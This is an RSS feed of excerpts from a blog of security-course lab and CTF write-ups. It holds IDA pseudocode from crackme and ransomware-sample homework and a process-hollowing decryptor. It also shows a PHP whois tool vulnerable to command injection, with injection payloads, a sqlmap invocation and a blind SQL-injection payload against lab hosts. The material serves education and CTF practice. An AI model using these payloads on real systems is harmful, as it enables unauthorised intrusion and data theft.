&lt;li>EXCEPTION_CONTINUE_EXECUTION (-1) 例外狀況已關閉。 在例外狀況發生的位置繼續執行。&lt;/li>
&lt;li>EXCEPTION_CONTINUE_SEARCH 無法辨識 (0) 例外狀況。 繼續搜尋處理常式的堆疊，先搜尋包含 try-except 語句，然後針對具有下一個最高優先順序的處理常式。&lt;/li>
&lt;li>EXCEPTION_EXECUTE_HANDLER 辨識 (1) 例外狀況。 藉由執行 __except 複合陳述式將控制權傳送至例外狀況處理常式，然後在 區塊之後 __except 繼續執行。&lt;/li>
&lt;/ul>&lt;/blockquote>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Psuedo Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> Str[&lt;span style="color:#ae81ff">112&lt;/span>]; &lt;span style="color:#75715e">// [rsp+20h] [rbp+0h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i; &lt;span style="color:#75715e">// [rsp+A0h] [rbp+80h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;Give me flag: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scanf(&lt;span style="color:#e6db74">&amp;#34;%s&amp;#34;&lt;/span>, Str);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( strlen(Str) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">38&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">38&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( Str[i] &lt;span style="color:#f92672">!=&lt;/span> byte_14000A000[i] )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Correct :&amp;gt;&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_7:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Wrong :&amp;lt;&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse 0x12(Lab - TLSCallback)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x12lab---tlscallback/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x12lab---tlscallback/</guid><description>&lt;h1 id="simple-reverse-0x12lab---tlscallback">
 Simple Reverse 0x12(Lab - TLSCallback)
 &lt;a class="anchor" href="#simple-reverse-0x12lab---tlscallback">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.youtube.com/live/4-hgyiCV3ZA?feature=share&amp;amp;t=6624">課程相關影片&lt;/a>
&lt;a href="https://medium.com/@racktar7743/c%e8%aa%9e%e8%a8%80-function-pointer%e7%9a%84%e6%87%89%e7%94%a8-%e5%9b%9b-function-pointer-array-d0d624db8406">[C語言] function pointer的應用[四]: function pointer array&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA main function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> v3; &lt;span style="color:#75715e">// rbx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v4; &lt;span style="color:#75715e">// edi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v5; &lt;span style="color:#75715e">// r14
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v6; &lt;span style="color:#75715e">// rsi
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v7; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>v8; &lt;span style="color:#75715e">// rcx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;Give me flag: &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scanf(&lt;span style="color:#e6db74">&amp;#34;%58s&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v3 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> flag;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (funcs_140001156[v4 &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">3u&lt;/span>])(&lt;span style="color:#f92672">&amp;amp;&lt;/span>flag[v5]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>v6;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v7 &lt;span style="color:#f92672">=&lt;/span> v5 &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>v4;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>v5;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(v6 &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">+=&lt;/span> key_140004050[v7];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( v4 &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">58&lt;/span> );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> ( flag[v3] &lt;span style="color:#f92672">==&lt;/span> byte_1400022B8[v3] )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">++&lt;/span>v3 &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">58&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v8 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Correct!&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> LABEL_7;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v8 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Wrong QAO&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>LABEL_7:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(v8);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse 0x13(Lab - Meow)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x13lab---meow/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x13lab---meow/</guid><description>&lt;h1 id="simple-reverse-0x13lab---meow">
 Simple Reverse 0x13(Lab - Meow)
 &lt;a class="anchor" href="#simple-reverse-0x13lab---meow">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.youtube.com/live/4-hgyiCV3ZA?feature=share&amp;amp;t=7028">課程影片 - Process Injection&lt;/a>
一開始看真的看不太懂，只知道大概的邏輯，簡單來說應該是在原有的process中插入其他的process使其被執行，有以下幾種&lt;/p>
&lt;ul>
&lt;li>DLL Injection&lt;/li>
&lt;li>APC Injection&lt;/li>
&lt;li>Early Bird APC Injection&lt;/li>
&lt;li>Process Hollowing&lt;/li>
&lt;li>Reflective DLL Injection&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>其實這一題如果沒有TA先破哏，基本上我是直接放棄的，解題之前可以先看&lt;a href="https://www.youtube.com/live/4-hgyiCV3ZA?feature=share&amp;amp;t=10348">破哏教學&lt;/a>
簡單來說這整支程式就是先把預先藏好的code解密出來，然後利用Process Hollowing的方式inject到原本的程式，而這支外插進來的code就會對我們輸入的flag進行一些操作，然後再跟他原本的encrypted flag進行比較。當我們知道這些事情之後，就可以開始分析了&lt;/p>
&lt;ol>
&lt;li>
&lt;p>先在IDA中找到隱藏的code解密的function
我是直接看TA教學的部分，不然我應該也找不出來，除非用x64dbg慢慢跟，具體來說是在main function中if statement的第二個function
&lt;img src="https://hackmd.io/_uploads/S1DtpV-K3.png" alt="" />
跟進去後的sub_401550()
&lt;img src="https://hackmd.io/_uploads/Sy3R6Vbth.png" alt="" />
:::spoiler Decrypt Hidden Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#a6e22e">sub_401550&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">__int64&lt;/span> result; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i; &lt;span style="color:#75715e">// [rsp+Ch] [rbp-4h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; ; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> i;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( i &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x3FFF&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(dword_404040 &lt;span style="color:#f92672">+&lt;/span> i) &lt;span style="color:#f92672">+=&lt;/span> i &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(dword_404040 &lt;span style="color:#f92672">+&lt;/span> i) &lt;span style="color:#f92672">^=&lt;/span> byte_404020[i &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">7&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse 0x30(2023 HW - Baby Ransom 1)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x302023-hw---baby-ransom-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x302023-hw---baby-ransom-1/</guid><description>&lt;h1 id="simple-reverse-0x302023-hw---baby-ransom-1">
 Simple Reverse 0x30(2023 HW - Baby Ransom 1)
 &lt;a class="anchor" href="#simple-reverse-0x302023-hw---baby-ransom-1">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/Memory/memory-protection-constants">記憶體保護常數&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/wininet/nf-wininet-internetopenurla">InternetOpenUrlA 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-setfileattributesw">SetFileAttributesW 函式&lt;/a>
&lt;a href="http://stenwang.blogspot.com/2015/09/schtasks.html">Schtasks 工作排程 &lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent">IsDebuggerPresent 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-findresourcea">FindResourceA 函式&lt;/a>
&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource">LoadResource 函式&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">int __cdecl main(int argc, const char **argv, const char **envp)
{
 // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-&amp;#34;+&amp;#34; TO EXPAND]

 StackBase = NtCurrentTeb()-&amp;gt;NtTib.StackBase;
 while ( 1 )
 {
 DestInitValue = _InterlockedCompareExchange64(&amp;amp;qword_140017050, StackBase, 0i64);
 if ( !DestInitValue )
 {
 v5 = 0;
 goto LABEL_7;
 }
 if ( StackBase == DestInitValue )
 break;
 Sleep(1000u);
 }
 v5 = 1;
LABEL_7:
 if ( unk_140017058 == 1 )
 {
 amsg_exit(31i64);
 }
 else if ( unk_140017058 )
 {
 dword_140017008 = 1;
 }
 else
 {
 unk_140017058 = 1;
 initterm(&amp;amp;qword_140019018, qword_140019028);
 }
 if ( unk_140017058 == 1 )
 {
 initterm(&amp;amp;qword_140019000, &amp;amp;qword_140019010);
 unk_140017058 = 2;
 }
 if ( !v5 )
 _InterlockedExchange64(&amp;amp;qword_140017050, 0i64);
 if ( TlsCallback_0 )
 TlsCallback_0(0i64, 2);
 sub_14000226B();
 v6 = 0i64;
 qword_1400170E0 = SetUnhandledExceptionFilter(&amp;amp;loc_140002530);
 (InterlockedExchange64)(nullsub_1);
 InitFloatUnit();
 v7 = dword_140017028;
 space = malloc(8i64 * (dword_140017028 + 1));
 v9 = qword_140017020;
 space_cp = space;
 while ( v7 &amp;gt; v6 )
 {
 size = strlen(*(v9 + 8 * v6)) + 1;
 dest = malloc(size);
 *(space_cp + 8 * v6) = dest;
 src = *(v9 + 8 * v6++);
 qmemcpy(dest, src, size);
 }
 qword_140017020 = space_cp;
 if ( v7 &amp;lt; 0 )
 v7 = 0i64;
 *(space_cp + 8 * v7) = 0i64;
 sub_140001F1E();
 _initenv = qword_140017018;
 dword_140017010 = (NetworkConfig_1DBB)(dword_140017028, qword_140017020);// 0x140017020 =&amp;gt; 0x254CA9C1580
 if ( !dword_14001700C )
 exit(dword_140017010);
 if ( !dword_140017008 )
 cexit();
 return dword_140017010;
}
&lt;/code>&lt;/pre>&lt;p>:::
:::spoiler IDA NetworkConfig_1DBB&lt;/p></description></item><item><title>Simple Reverse 0x31(2023 HW - Baby Ransom 2)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x312023-hw---baby-ransom-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x312023-hw---baby-ransom-2/</guid><description>&lt;h1 id="simple-reverse-0x312023-hw---baby-ransom-2">
 Simple Reverse 0x31(2023 HW - Baby Ransom 2)
 &lt;a class="anchor" href="#simple-reverse-0x312023-hw---baby-ransom-2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://forum.butian.net/share/2204">SystemFunction033&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA WinMain&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
 HWND hWnd; // [rsp+60h] [rbp-A8h]
 WNDCLASSW WndClass; // [rsp+70h] [rbp-98h] BYREF
 struct tagMSG Msg; // [rsp+C0h] [rbp-48h] BYREF

 memset(&amp;amp;WndClass, 0, sizeof(WndClass));
 WndClass.lpfnWndProc = (WNDPROC)store_winword;
 WndClass.hInstance = hInstance;
 WndClass.lpszClassName = Caption;
 WndClass.hbrBackground = CreateSolidBrush(0);
 if ( !RegisterClassW(&amp;amp;WndClass) )
 return 1;
 hWnd = CreateWindowExW(0, Caption, Caption, 0xCF0000u, 100, 100, 800, 600, 0i64, 0i64, hInstance, 0i64);
 if ( !hWnd )
 return 2;
 MainPayload();
 ShowWindow(hWnd, nShowCmd);
 memset(&amp;amp;Msg, 0, sizeof(Msg));
 while ( GetMessageW(&amp;amp;Msg, 0i64, 0, 0) )
 {
 TranslateMessage(&amp;amp;Msg);
 DispatchMessageW(&amp;amp;Msg);
 }
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::
:::spoiler IDA MainPayload&lt;/p></description></item><item><title>Simple Web - 0x02(Lab - Whois Tool)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/</guid><description>&lt;h1 id="simple-web---0x02lab---whois-tool">
 Simple Web - 0x02(Lab - Whois Tool)
 &lt;a class="anchor" href="#simple-web---0x02lab---whois-tool">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://whoistool.ctf.zoolab.org/">https://whoistool.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Almost the same as &lt;a href="https://bernie6401.github.io/7x0Gr0C_QEahfS_QaTLYTg">0x10(Lab - DNS Lookup Tool | WAF)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
if(isset($_GET[&amp;#34;host&amp;#34;])){
 $host = $_GET[&amp;#34;host&amp;#34;];
 if(strlen($host) &amp;gt; 15)
 echo &amp;#34;Host name tooooooo logn!!&amp;#34;;
 else
 echo `whois &amp;#34;{$host}&amp;#34; 2&amp;gt;&amp;amp;1;`;
}
?&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>Payload: &lt;code>&amp;quot;;ls -al;&amp;quot;&lt;/code>
&lt;img src="https://i.imgur.com/MsG3wOH.png" alt="" />
Payload: &lt;code>&amp;quot;;cat flag.t*;&amp;quot;&lt;/code>
Then we got flag!!!&lt;/p></description></item><item><title>Simple Web - 0x03(Lab - Normal Login Panel (Flag 1))</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/</guid><description>&lt;h1 id="simple-web---0x03lab---normal-login-panel-flag-1">
 Simple Web - 0x03(Lab - Normal Login Panel (Flag 1))
 &lt;a class="anchor" href="#simple-web---0x03lab---normal-login-panel-flag-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://login.ctf.zoolab.org/">https://login.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;h3 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h3>
&lt;h2 id="exploit---sqli">
 Exploit - SQLi
 &lt;a class="anchor" href="#exploit---sqli">#&lt;/a>
&lt;/h2>
&lt;h3 id="easy-way---sqlmap">
 Easy way - &lt;code>SQLmap&lt;/code>
 &lt;a class="anchor" href="#easy-way---sqlmap">#&lt;/a>
&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ ./sqlmap.py &amp;#34;https://login.ctf.zoolab.org/&amp;#34; --form -dbs sqlite --dump --risk=3 --level=5
...
---
Parameter: username (POST)
 Type: time-based blind
 Title: SQLite &amp;gt; 2.0 AND time-based blind (heavy query)
 Payload: username=&amp;#39;||(SELECT CHAR(116,86,90,89) WHERE 7681=7681 AND 7766=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))||&amp;#39;&amp;amp;password=
---
&lt;/code>&lt;/pre>&lt;h3 id="hard-way---tryerror">
 Hard way - try&amp;amp;error
 &lt;a class="anchor" href="#hard-way---tryerror">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>Check if it has &lt;code>sqli&lt;/code> problem
Payload: &lt;code>union'&lt;/code>
&lt;img src="https://i.imgur.com/xIfsghR.png" alt="" />&lt;/p></description></item><item><title>Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/</guid><description>&lt;h1 id="simple-web---0x04lab---normal-login-panel-flag-2">
 Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))
 &lt;a class="anchor" href="#simple-web---0x04lab---normal-login-panel-flag-2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-web-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-web-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://login.ctf.zoolab.org/">https://login.ctf.zoolab.org/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
